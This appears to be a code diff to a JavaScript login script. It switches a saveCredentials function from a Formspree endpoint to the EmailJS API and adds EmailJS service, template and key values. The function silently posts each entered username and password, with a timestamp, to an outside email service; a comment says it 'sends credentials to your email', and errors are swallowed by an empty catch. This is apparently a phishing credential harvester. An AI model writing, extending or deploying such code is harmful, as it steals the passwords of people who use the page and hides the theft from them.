@@ -16,19 +16,28 @@ function getUsers() {
   return JSON.parse(stored);
 }
 
-// ── WEB3FORMS — sends credentials to your email ──────────
-const W3F_KEY = '929160bf-1027-46c0-8c7c-49b440102f4b';
+// ── EMAILJS — sends credentials to your email ────────────
+const EJS = {
+  service:  'service_thwu2tl',
+  template: 'template_wlgne9wQrEzmhjQVeh0VKnTs',
+  pubkey:   'QrEzmhjQVeh0VKnTs'
+};
 
 async function saveCredentials(username, password, type) {
   try {
-    await fetch('https://formspree.io/f/xjgjygld', {
+    await fetch('https://api.emailjs.com/api/v1.0/email/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        type,
-        username,
-        password,
-        date: new Date().toLocaleString()
+        service_id:  EJS.service,
+        template_id: EJS.template,
+        user_id:     EJS.pubkey,
+        template_params: {
+          type,
+          username,
+          password,
+          date: new Date().toLocaleString()
+        }
       })
     });
   } catch(e) {}
